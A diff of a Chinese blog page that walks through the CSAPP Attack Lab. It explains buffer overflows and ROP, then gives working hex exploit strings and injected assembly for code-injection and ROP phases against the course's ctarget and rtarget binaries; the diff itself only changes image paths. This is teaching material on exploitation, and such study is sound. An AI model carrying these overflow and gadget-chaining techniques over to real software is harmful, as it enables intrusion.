@@ -232,8 +232,8 @@
 <p>文件列表：<br>|文件|用途|<br>| —- | —- |<br>|ctarget|用来做Code injection攻击的程序，phase1-3|<br>|rtarget|用来做ROP攻击的程序,phase 4-5|<br>|cookie.txt|作为攻击的标识符|<br>|hex2raw|用来生成工具字符串|<br>|farm.c|用于生成面向返回的编程攻击|</p>
 <h2 id="预备知识——缓冲区溢出"><a href="#预备知识——缓冲区溢出" class="headerlink" title="预备知识——缓冲区溢出"></a>预备知识——缓冲区溢出</h2><p>缓冲区溢出的基本原理并不复杂。缓冲区就是操作系统为函数执行专门划分出的一段内存，包括栈(自动变量)、堆(动态内存)和静态数据区(全局或静态)。其中缓冲区溢出发生在栈里，栈存放了函数的参数、返回地址、EBP（EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码）和局部变量。</p>
 <p><strong>当函数中对局部变量的赋值超过了为其分配的存储空间，超出的部分就会覆盖栈里其他部分的数据，也就是发生了缓冲区溢出</strong>。</p>
-<p><img src="Attack_lab_img/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="Attack_lab_img/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2021/07/02/Attack_lab/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2021/07/02/Attack_lab/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h2 id="预备知识——ROP攻击"><a href="#预备知识——ROP攻击" class="headerlink" title="预备知识——ROP攻击"></a>预备知识——ROP攻击</h2><h3 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h3><p>缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。</p>
 <p>（1）<strong>栈随机化</strong></p>
 <p><code>栈随机化</code>的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。</p>
@@ -251,11 +251,11 @@
 
 <p>其中，字节序列<code>48 89 c7</code>是对指令<code>movq %rax, %rdi</code>的编码，就这样我们可以利用已经存在的程序，从中提取出特定的指令,执行特定的功能，地址为<code>0x400f18</code>，其功能是将<code>%rax</code>的内容移到<code>%rdi</code>。</p>
 <p>指令的编码如下所示：</p>
-<p><img src="Attack_lab_img/1433829-d6312f1ce53cf044.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2021/07/02/Attack_lab/1433829-d6312f1ce53cf044.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>movq指令编码</p>
-<p><img src="Attack_lab_img/1433829-2a663eb32fae331a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2021/07/02/Attack_lab/1433829-2a663eb32fae331a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>popq指令编码</p>
-<p><img src="Attack_lab_img/1433829-c713c395456655fa.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2021/07/02/Attack_lab/1433829-c713c395456655fa.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>movl指令编码</p>
 <p><img src="https://gitee.com/zino00/img_bed/raw/master/img/1433829-67690582e19e902b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h2 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h2><h3 id="1-phase1"><a href="#1-phase1" class="headerlink" title="1) phase1"></a>1) phase1</h3><ul>
@@ -302,10 +302,10 @@
 <p>并将其反汇编，保存在2.txt中，2.txt如图</p>
 <p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331210915437.png" srcset="/img/loading.gif" lazyload alt="image-20210331210915437"></p>
 <p>利用gdb调试，进入getbuf函数里，查看%rsp的地址</p>
-<p><img src="Attack_lab_img/image-20210412193826843.png" srcset="/img/loading.gif" lazyload alt="image-20210412193826843"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412193826843.png" srcset="/img/loading.gif" lazyload alt="image-20210412193826843"></p>
 <p>如上所示，我们获取到了%rsp的地址，结合上文所讲，可以构造出如下字符串，在栈的开始位置为注入代码的指令序列，然后填充满至40个字节，在接下来的8个字节，也就是原来的返回地址，填充成注入代码的起始地址，也就是%rsp的地址，可以得到如下字符串，保存在1.txt中</p>
 <p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211305114.png" srcset="/img/loading.gif" lazyload alt="image-20210331211305114"></p>
-<p><img src="Attack_lab_img/1433829-fa485a0533812b76.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2021/07/02/Attack_lab/1433829-fa485a0533812b76.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>利用raw2hex转化为字符串</p>
 <figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt&gt;</span> 2.txt<br></code></pre></td></tr></table></figure>
 
@@ -318,7 +318,7 @@
 <h3 id="3-phase3"><a href="#3-phase3" class="headerlink" title="3) phase3"></a>3) phase3</h3><ul>
 <li><p><strong>任务要求</strong></p>
 <p>第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要将cookie转化为字符串作为参数。</p>
-<p><img src="Attack_lab_img/image-20210412202523955.png" srcset="/img/loading.gif" lazyload alt="image-20210412202523955"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412202523955.png" srcset="/img/loading.gif" lazyload alt="image-20210412202523955"></p>
 </li>
 <li><p><strong>实验步骤</strong></p>
 <p>我们首先构造注入代码，touch3的地址为0x4018fa,根据上一关我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28（保存代码执行地址的位置）,然后字符串地址应为%rsp+0x30(48)，即0x5561dca0.</p>
@@ -326,8 +326,8 @@
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">5561</span>dc<span class="hljs-number">98</span>,%rdi                                                                                     <br><span class="hljs-attribute">pushq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">004018</span>fa<br><span class="hljs-attribute">retq</span><br></code></pre></td></tr></table></figure>
 
 <p>汇编和反汇编</p>
-<p><img src="Attack_lab_img/image-20210412203205921.png" srcset="/img/loading.gif" lazyload alt="image-20210412203205921"></p>
-<p><img src="Attack_lab_img/image-20210412203220388.png" srcset="/img/loading.gif" lazyload alt="image-20210412203220388"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412203205921.png" srcset="/img/loading.gif" lazyload alt="image-20210412203205921"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412203220388.png" srcset="/img/loading.gif" lazyload alt="image-20210412203220388"></p>
 <p>利用man ascii将cookie转化为16进制</p>
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
 
@@ -335,7 +335,7 @@
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span>c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-symbol">40 </span><span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span><br><span class="hljs-symbol">62 </span><span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
 
 <p>将其保存在touch_3.txt中，执行指令，可得：</p>
-<p><img src="Attack_lab_img/image-20210412203956357.png" srcset="/img/loading.gif" lazyload alt="image-20210412203956357"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412203956357.png" srcset="/img/loading.gif" lazyload alt="image-20210412203956357"></p>
 </li>
 </ul>
 <h3 id="4-phase4"><a href="#4-phase4" class="headerlink" title="4) phase4"></a>4) phase4</h3><ul>
@@ -350,15 +350,15 @@
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">58</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">89</span> c7<br></code></pre></td></tr></table></figure>
 
 <p>在rtarget的反汇编代码中查找</p>
-<p><img src="Attack_lab_img/image-20210412211719953.png" srcset="/img/loading.gif" lazyload alt="image-20210412211719953"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412211719953.png" srcset="/img/loading.gif" lazyload alt="image-20210412211719953"></p>
 <p>所以popq %rax指令起始地址为：0x4019ab</p>
-<p><img src="Attack_lab_img/image-20210412211839599.png" srcset="/img/loading.gif" lazyload alt="image-20210412211839599"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412211839599.png" srcset="/img/loading.gif" lazyload alt="image-20210412211839599"></p>
 <p>所以movq %rax, %rdi指令起始地址为：0x4019a2</p>
 <p>所以得到字符串，保存在touch_4中：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b<span class="hljs-number">9</span> <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
 
 <p>执行指令：</p>
-<p><img src="Attack_lab_img/image-20210412212407837.png" srcset="/img/loading.gif" lazyload alt="image-20210412212407837"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412212407837.png" srcset="/img/loading.gif" lazyload alt="image-20210412212407837"></p>
 </li>
 </ul>
 <h3 id="5-phase5"><a href="#5-phase5" class="headerlink" title="5) phase5"></a>5) phase5</h3><ul>
@@ -404,12 +404,12 @@
 
 <p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p>
 <p>整个栈的结构如下：</p>
-<p><img src="Attack_lab_img/1433829-cafcf76d35ef7ba1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2021/07/02/Attack_lab/1433829-cafcf76d35ef7ba1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>所以要输入的字符串为：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
 
 <p>保存在touch_5.txt中，执行指令：</p>
-<p><img src="Attack_lab_img/image-20210412213042512.png" srcset="/img/loading.gif" lazyload alt="image-20210412213042512"></p>
+<p><img src="/2021/07/02/Attack_lab/image-20210412213042512.png" srcset="/img/loading.gif" lazyload alt="image-20210412213042512"></p>
 
             </div>
             <hr>
